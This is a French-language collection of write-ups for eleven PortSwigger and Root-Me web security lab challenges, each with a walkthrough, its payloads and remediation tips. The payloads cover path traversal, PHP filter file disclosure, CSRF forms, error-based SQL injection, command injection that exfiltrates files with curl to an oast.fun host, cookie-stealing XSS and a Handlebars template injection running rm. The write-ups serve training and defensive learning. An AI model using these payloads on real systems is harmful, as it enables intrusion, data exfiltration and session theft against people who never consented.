# Sécurité web Challenges

## 1. File path traversal, validation of file extension with null byte bypass

### Lien :

https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Le titre indique une faille liée au null byte, et le contenu montre que la vulnérabilité est aussi au niveau du chemin des images.

Donc j'intercepte le chargement des images avec Burp.

### Requête de base :

```http
GET /image?filename=38.jpg
```

En testant, je remarque que je peux modifier le paramètre filename et ajouter un path traversal.
Je tente :

```http
../../../../../../../etc/passwd%00.jpg
```

Le %00 correspond au null byte, ce qui permet de stopper la lecture réelle du nom de fichier après /etc/passwd, tout en gardant .jpg pour passer la validation.

### Payload :

```http
GET /image?filename=../../../../../../../etc/passwd%00.jpg
```

![screenshot preuve](images/chall1.png "Path traversal")

### Pour sécurisé :

- Éviter d'utiliser directement la valeur fournie par l'utilisateur dans une fonction
- Au lieu de laisser l'utilisateur choisir image.jpg, on lui donne un index
- Le serveur doit construire lui-même le chemin final.
- Faire une whitelist
- Utiliser chroot pour empêche l'application d'accéder à autre chose que son dossier.

---

## 2. PHP-Filters

### Lien :
https://www.root-me.org/fr/Challenges/Web-Serveur/PHP-Filters

### Déroulement :
Le site a été codé de manière à inclure le contenu des pages avec la fonction `include` de PHP via un paramètre fourni dans l’URL (par exemple : `?inc=login.php`).  
La fonction `include` est donc ici utilisée dans le but de lire le fichier spécifié, d’exécuter tout le code PHP qu’il contient et d’afficher uniquement le résultat final.

On peut alors contourner ce comportement en empêchant l’exécution du code PHP afin de récupérer le contenu réel du fichier.  
Pour cela, il est possible d’utiliser un flux spécial tel que : `php://filter/convert.base64-encode/resource=`.

Ce flux demande à PHP d’ouvrir le fichier ciblé, d’appliquer un encodage Base64 sur son contenu brut, puis de renvoyer ce contenu encodé sans l’interpréter.  
Comme le résultat n’est plus un fichier PHP exécutable, `include` ne peut pas l’évaluer et se contente de l’afficher tel quel.

On décode alors cette Base64 afin de retrouver le code original de `login.php`, qui se trouve être :
```
<?php
include("config.php");

if ( isset($_POST["username"]) && isset($_POST["password"]) ){
    if ($_POST["username"]==$username && $_POST["password"]==$password){
      print("<h2>Welcome back !</h2>");
      print("To validate the challenge use this password<br/><br/>");
    } else {
      print("<h3>Error : no such user/password</h2><br />");
    }
} else {
?>

<form action="" method="post">
  Login&nbsp;<br/>
  <input type="text" name="username" /><br/><br/>
  Password&nbsp;<br/>
  <input type="password" name="password" /><br/><br/>
  <br/><br/>
  <input type="submit" value="connect" /><br/><br/>
</form>

<?php } ?>
```

On remarque alors que le fichier `login.php` fait lui-même un include d'un fichier nommé `config.php`. On va donc appliquer le même procédé sur ce fichier afin de lire son contenu.

Le code original de `config.php` s’avère être :
```
<?php
$username="admin";
$password="DAPt9D2mky0APAF";
```

On retrouve donc l'utilisateur ainsi que le mot de passe du compte administrateur.

### Payload :
```
?inc=php://filter/convert.base64-encode/resource=config.php
```

### Conclusion :
![screenshot preuve](images/chall2.png)
➔ **On a pu se connecter en tant qu'administrateur, ce qui nous permet de valider le challenge.**

### Pour sécurisé :
- N’autoriser que des noms de fichiers prédéfinis (whitelist + mapping interne).  
- Désactiver les wrappers / inclusions via URL : allow_url_include = Off.  
- Utiliser realpath() + chemins absolus pour éviter toute inclusion hors répertoire autorisé.  

Référence : https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion

---

## 3. CSRF - contournement de jeton

### Lien :

https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton

Le but du challenge est d'acceder à la page private qui est seulement disponible pour un utilisateur admin, on a un formulaire profile avec un checkbox status, on suppose que si c'est check on est admin. On a un formulaire contact dont il ne filtre pas les script , alors on peut injecter un script avec le formulaire de changement de profile.


### Payload :

```
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
xhr.send(); 
const response = xhr.responseText 

const token = response.match(/[abcdef0123456789]{32}/g)[0]
<form name="e" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
			<div>
			<label>Username:</label>
			<input id="username" type="text" name="username" value="test">
			</div>
			<br>		
			<div>
			<label>Status:</label>
			<input id="status" type="checkbox" name="status" checked>
			</div>
			<br>
			<input id="token" type="hidden" name="token" value=`${token}`>
			<button type="submit">Submit</button>
</form>
document.getElementById('profile').submit()
```



![screenshot preuve](images/chall3.png "contournement de jeton")

### Pour sécurisé :
-Validation du Jeton (Côté Serveur)
-filtrer les formulaire

---

## 4. CRSF where token is not tied to user session

### Lien :
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

### Déroulement :
Le site a été codé de manière à protéger les **actions sensibles** du compte utilisateur (comme le changement d’adresse e-mail) à l’aide d’un `jeton CSRF` transmis dans le formulaire. Ce jeton est inclus dans la page `/my-account?id=` via un input caché sous celui dédié à l’adresse e-mail.  
Lors du changement d’adresse via le bouton `Update email`, une requête `POST /my-account/change-email` est envoyée et vérifiée par le serveur avant de traiter la **modification demandée**.

Normalement, la vérification `CSRF` permet de s’assurer que :  
- la requête provient d’un **formulaire légitime**,  
- et que le jeton correspond à la **session** de l’utilisateur connecté.

Afin de vérifier si le deuxième point s’applique bien à ce site, on va dans un premier temps récupérer un jeton `CSRF` avec le premier compte qui nous est fourni (**wiener**) avant de venir le réutiliser dans une requête effectuée par le deuxième compte (**carlos**).

On commence donc par se connecter avec **wiener** avant d’aller sur la page de changement d’e-mail `/my-account?id=`, puis on intercepte simplement la requête `POST /my-account/change-email` lors du clic sur le bouton `Update email`.
La requête se présente sous cette forme :

```http
POST /my-account/change-email HTTP/2
Host: 0ae800f003870791803a03e7005700eb.web-security-academy.net
Cookie: session=g5G0MdjZiyQfgxnywLcDfEgQ4yJQ1c1E
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Origin: https://0ae800f003870791803a03e7005700eb.web-security-academy.net
Referer: https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

email=change%40gmail.com&csrf=FYI1Ux2XtGDeisUmRmuC7yCg30hhwaTl
```

On remarque la présence du `CSRF` (`FYI1Ux2XtGDeisUmRmuC7yCg30hhwaTl`) en bas de la requête.  
On va donc venir le récupérer tout **en pensant bien à drop la requête par la suite** afin de ne pas consommer le jeton.  
Ensuite, on peut se connecter avec un second compte, celui de la victime (par exemple **carlos**), dans un autre navigateur ou via une page en navigation privée.

Depuis ce second compte, on change le `CSRF` dans l'input caché qu’on retrouve dans la page `/my-account?id=` par celui de **wiener**, et on envoie la requête `POST /my-account/change-email` de changement d’e-mail (qui va conserver les **cookies** de la session de **carlos**).

On remarque alors que le serveur accepte cette requête et modifie l’e-mail du compte de **carlos**, quand bien même notre jeton `CSRF` avait été généré pour la session de **wiener**.  
Cela nous montre bien que le jeton n’est **pas lié à la session**, mais est uniquement vérifié globalement comme “valide”.

Maintenant qu’on sait cela, on va faire en sorte d’exploiter cette faille de manière plus concrète en effectuant le même procédé mais via une **page HTML malveillante** qui soumet automatiquement cette requête lorsque la victime la visite.  
Pour ce faire, on va créer une page très sommaire qui contient un formulaire caché reprenant les champs `email` et `CSRF`, ainsi qu’un script embarqué qui soumet immédiatement celui-ci :

```html
<form action="https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj">
</form>
<script>
  document.forms[0].submit();
</script>
```

En hébergeant cette page sur l’`exploit server` fourni par le lab et en la faisant charger par le navigateur de la victime (**wiener**) (toujours connectée à son compte) via le bouton `Deliver exploit to victim`, le formulaire est alors automatiquement soumis avec sa session, mais avec le jeton `CSRF` et l'adresse e-mail que l’on a choisis (`attacker@example.com` et `rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj`).

### Payload :
```
<form action="https://0ae800f003870791803a03e7005700eb.web-security-academy.net/my-account/change-email?id=wiener" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="csrf" value="rdl4ztPgUO7rXrPWfCuDXeecnwocwaAj">
</form>
<script>
  document.forms[0].submit();
</script>
```

### Conclusion :
![screenshot preuve](images/chall4.png)
➔ **On a pu modifier l’adresse e-mail de la victime sans son consentement, ce qui nous permet de valider le challenge.**

### Pour sécurisé :
- Lier le jeton CSRF à la session de l’utilisateur.
- Régénérer un token unique par action sensible.
- Activer SameSite sur les cookies.

Référence : https://owasp.org/www-community/attacks/csrf

---

## 5. CSRF where Referer validation depends on header being present

### Lien :

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

### Aide :

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses

Ce labo montre que la protection CSRF repose uniquement sur le header Referer.
Le serveur vérifie simplement :

- si le Referer est présent et vient du même domaine il accepte mais si le domaine est modiifer non.
- si le Referer est absent, il accepte aussi

Donc si on arrive à enlever complètement le Referer, on contourne la protection.

Selon MDN, permet de supprime le referer :
https://developer.mozilla.org/fr/docs/Web/HTTP/Reference/Headers/Referrer-Policy

```http
Referrer-Policy: no-referrer
```

Pour exploiter, il faut donc renvoyer une page HTML qui contient :

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: no-referrer
```

Puis dans le body de la réponse, un formulaire qui envoie la requete :

```html
<form
  class="login-form"
  name="change-email-form"
  action="https://0ab700b503c3052d8113390d000f002c.web-security-academy.net/my-account/change-email"
  method="POST"
>
  <input required type="email" name="email" value="tttt@test.fr" />
  <button class="button" type="submit">Update email</button>
</form>

<script>
  document.forms[0].submit();
</script>
```

![screenshot preuve](images/chall5.png "CSRF ")

### Pour sécurisé :

- Utiliser des CSRF tokens imprévisibles

- Le token doit être lié à la session utilisateur et vérifié avant l'exécution dune action sensible.

- Générer les tokens avec un CSPRNG (Cryptographically Secure Pseudo-Random Number Generator) : timestamp + secret interne + entropie système.

- Stocker le token côté serveur, dans la session.

- Vérifier que la requête entrante contient exactement le même token que celui enregistré en session.

---

## 6. JWT - Jeton révoqué

### Lien :

https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Dans l'énoncer, il nous a donné les endpoint POST : /web-serveur/ch63/login, GET : /web-serveur/ch63/admin et le code source du server, on a pu récupérer les information: de l'admin et l'algorime du système de blacklist


### Requête pour se connecter :

```
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login

```
### Retour de la commande :

```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8"}

```

### Requête Payload :

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8= " http://challenge01.root-me.org/web-serveur/ch63/admin
```

![screenshot preuve](images/chall6.png "Jeton revoque")

### Pour sécurisé :

- Éviter d'utiliser un système de blacklist mieux prévilligier le whiteliste

---

## 7. SQL injection - Error

### Lien :

https://www.root-me.org/fr/Challenges/Web-Serveur/SQL-injection-Error

En allant sur la page contents, j'ai vu dans l'URL qu'il y a deux paramètres :
action et order.

En testant par erreur en mettant une chaîne de caractères dans order, j'ai obtenu une erreur SQL affichée directement sur la page.

À partir de là, j'ai essayé d'envoyer ma propre requête SQL pour explorer les tables présentes dans la base.

Le serveur n'accepte d'afficher qu'une seule donnée et il faut contourner le type attendu avec un CAST().Extraction du nom de la table

### Payload :

```sql
?action=contents&order=,CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS FLOAT)
```

Résultat dans l'erreur :

```sql
ERROR: invalid input syntax for type double precision: "m3mbr35t4bl3"
```

Donc le nom de la table est m3mbr35t4bl3.

Comme les quotesne sont pas autorisées dans le paramètre order, j'ai dû reconstruire la chaîne avec CHR()

```sql
m3mbr35t4bl3 =
CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51)
```

### Extraction du nom des colonnes :

Deuxième colonne (la première étant l'ID)

```sql
?action=contents&order=,CAST((SELECT column_name FROM information_schema.columns WHERE table_name=CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51) LIMIT 1 OFFSET 1) AS FLOAT)
```

### Erreur retournée :

```sql
ERROR: invalid input syntax for type double precision: "us3rn4m3_c0l"
```

Donc deuxième colonne : us3rn4m3_c0l

Troisième colonne

```sql

?action=contents&order=,CAST((SELECT column_name FROM information_schema.columns WHERE table_name=CHR(109)||CHR(51)||CHR(109)||CHR(98)||CHR(114)||CHR(51)||CHR(53)||CHR(116)||CHR(52)||CHR(98)||CHR(108)||CHR(51) LIMIT 1 OFFSET 2) AS FLOAT)
```

Troisième colonne retournée :

p455w0rd_c0l

### Extraction du mot de passe :

Avec le nom de la table + le nom des colonnes, j'ai pu envoyer :

```sql
?action=contents&order=,CAST((SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1) AS FLOAT)
```

Et le mot de passe apparaît dans l'erreur SQL :

![screenshot preuve](images/chall7.png "Injection SLQ")

### Pour sécurisé :

- Utiliser des requêtes préparées / paramétrées au lieu de concaténer les valeurs directement dans la requête SQL.
- Côté serveur, n'accepter que des valeurs prévues pour des paramètres
- Si on est obligé d'avoir une requête dynamique, échapper correctement les caractères spéciaux (quotes, etc.) en plus de la validation (mais ça reste secondaire par rapport aux requêtes paramétrées).
- Utiliser un ORM ou un framework (Symfony, Laravel, etc.) qui gère les requêtes préparées et évite la plupart des injections par défaut.

---

## 8. Injection de commande - Contournement de filtre

### Lien :

https://www.root-me.org/fr/Challenges/Web-Serveur/Injection-de-commande-Contournement-de-filtre

En soumettant le formulaire avec Burp, on peut observer que l'application envoie l'IP directement dans un header.
En testant différents caractères, j'ai vu que certains séparateurs de lignes étaient acceptés comme %0A.

Le but du lab était de récupérer le contenu du fichier index.php, puis extraire le flag contenu dans .passwd.

Je me suis aidé de :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection

Récupérer index.php

J'ai remarqué qu'en utilisant curl, on pouvait envoyer un fichier (en POST) vers un serveur externe (Interactsh).

### Payload :

```http
ip=127.0.0.1%0Acurl -X POST -d @index.php bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

https://curl.se/docs/manpage.html

```http
ip=127.0.0.1%0Acurl -X POST -d @index.php bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

![screenshot preuve](images/chall8-1.png "Injection commande")

### Récupérer .passwd :

Dans le contenu de index.php, on voit que le serveur lit .passwd, mais ne l'affiche pas directement.
Donc il reste à exfiltrer ce fichier de la même manière.

Payload :

```http
ip=127.0.0.1%0Acurl -X POST -d @.passwd bflwwcoiewtvlkzyhkkukrs1vr8bc8y1f.oast.fun
```

![screenshot preuve](images/chall8-2.png "Injection commande")

### Pour sécurisé :

- ne pas exécuter directement une entrée utilisateur dans une commande système.
- Mettre une validation stricte côté serveur (whitelist) sur les paramètres sensibles.
- Échapper les caractères spéciaux si une commande dynamique est vraiment nécessaire.
- Utiliser un sandbox / chroot / conteneur pour limiter l'accès aux fichiers du système.
- Utiliser des bibliothèques/frameworks qui évitent les injections de commandes.

---

## 9. XSS vulnerability

### Lien :
https://www.root-me.org/fr/Challenges/Web-Client/XSS-Stockee-2

### Déroulement :
Le site a été codé de manière à inclure **deux fois** dans le `DOM` un cookie `status` qui permet d'indiquer le status des personnes qui laissent un commentaire sur celui-ci.
La première utilisation du cookie dans le DOM se fait via l'affichage de la valeur de celui dans une balise `<i>` **mais de manière échappée** (ce qui ne représente pas de faille).
Cependant, **la deuxième utilisation en tant que nom de classe CSS**, elle, n'est **pas échappée**.
De ce fait, on va pouvoir utiliser une faille XSS dont le but sera de récuperer un éventuel cookie de session admin.

On construit donc un payload simple qui sera remplacé par ce cookie `status` (initialement set à `invite`), qui aura pour but de **sortir du contexte HTML** afin d’injecter ensuite notre balise `<script>` contenant un code javascript **chargé de récupérer le cookie**.

Cependant, afin de **récupérer le cookie sans l'afficher dans un `alert()`** qui surgirait chez tous les utilisateurs accédant à la page (ce qui serait visible, bruyant et immédiatement suspect), on va plutôt opter pour **Interactsh**, un site permettant de **confirmer discrètement l’exécution du script sur une adresse unique fournie par le service** (en l'occurrence ici `ymidnwwmojcwyvvxoveyqv3bt2jchyygo.oast.fun`), et tout cela **sans rien afficher côté client**.


Ainsi, on forme donc un script de ce genre qui remplacera la valeur `invite` du cookie `status` :

```html
"><script>document.location.href="https://ymidnwwmojcwyvvxoveyqv3bt2jchyygo.oast.fun/?cookie="+document.cookie</script>
```

Enfin, après un peu d'attente, on observe qu'un admin a consulté les messages et que son cookie de session a bien été loggé sur notre serveur **Interactsh** :
![screenshot preuve](images/chall9-1.png)

On peut donc créer un nouveau cookie `ADMIN_COOKIE` avec la valeur `SY2USDIH78TF3DFU78546TE7F` afin de **se connecter en tant qu'admin**.

![screenshot preuve](images/chall9-2.png)
➔ **On a pu récupérer le cookie de session de l'admin et se connecter via celui-ci sans son consentement, ce qui nous permet de valider le challenge.**

### Pour sécurisé :
- Échapper toutes les données utilisateur avant insertion dans le HTML.
- Bloquer l’injection dans les attributs HTML sensibles (class, style, on*…).
- Ajouter une politique CSP pour limiter l’exécution de scripts.

Référence : https://owasp.org/www-community/attacks/xss

---

## 10. Lab: Server-side template injection in an unknown language with a documented exploit

### Lien :

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

La piste était de cliquer sur les produit. lorsqu'on produit n'est pas disponible l'url nous donne url /?message=Unfortunately%20this%20product%20is%20out%20of%20stock. Ici on a une entré vulnérable , on cherche sur payloadallthethings dans la mtehodologie il nous donne ${{<%[%'"}}%\. Grâce à ca on a pu derterminer que le moteur de template etait du handlebar. on cherche sur google Handlebars server-side template injection , on trouve ce script 
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}

```
on encode_url le code puis on passe dans l'url 

![screenshot preuve](images/chall10.png "Server-side template injection")

### Pour sécurisé :
-Tests de Sécurité (Fuzzing) : Intégrer des tests automatisés qui injectent des chaînes de fuzzing (comme ${{<%[%'"}}%) dans tous les paramètres d'entrée, pour s'assurer qu'aucune erreur de compilation ou d'exécution de template n'est renvoyée.
-ne pas mettre de message d'erreur dans l'url

---

## 11. API - Mass Assignment

### Lien :

https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment

J'ai exploré les différents endpoints avec Burp afin de comprendre le fonctionnement de l'API.

### Création d'un compte :

J'ai pu me créer un compte via :

```http
POST /api/signup HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Accept: application/json

{
"username": "test",
"password": "test"
}
```

Une fois logué, j'ai récupéré le cookie de session fourni par le serveur dans la réponse du login.

### Vérification de mon profil utilisateur :

Requête :

```http
GET /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Accept: application/json
Cookie: session=...
```

Réponse :

```json
{
  "note": "",
  "status": "guest",
  "userid": 18,
  "username": "test"
}
```

Donc par défaut, je suis en statut : guest.

### Blocage sur l'endpoint /api/flag :

En appelant /api/flag, l'API me répond :

```json
{ "error": "Unauthorized, user is not admin." }
```

Il faut donc être admin pour accéder au flag.

J'ai tenté un PUT sur /api/user en modifiant directement mon statut :

Payload :

```http
PUT /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Cookie: session=...

{
"status": "admin"
}
```

Et ça fonctionnée
![screenshot preuve](images/chall11-1.png "API Assignment")

Maintenant que mon statut est admin, j'ai pu accéder au flag :

```http
GET /api/flag
```

![screenshot preuve](images/chall11-2.png "API Assignment")

### Pour sécurisé :

- ALLOWLIST des champs modifiables
- Interdire la modification de champs sensibles (status, role, permissions)
- Ne jamais mapper automatiquement les données du client
- Contrôle d'accès avant modification